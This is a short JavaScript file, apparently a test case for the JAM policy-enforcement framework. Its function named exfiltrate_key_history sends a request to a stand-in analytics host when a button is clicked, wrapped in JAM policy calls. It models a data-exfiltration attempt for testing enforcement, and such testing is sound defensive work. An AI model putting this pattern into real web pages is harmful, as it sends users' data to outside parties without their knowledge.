
JAM.startProfile('load');
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true], JAM.policy.p1);
  xmlhttp.send(null);
  return;
}
var v0 = document.getElementById("test");
JAM.set(v0, "onclick", exfiltrate_key_history)

JAM.stopProfile('load');
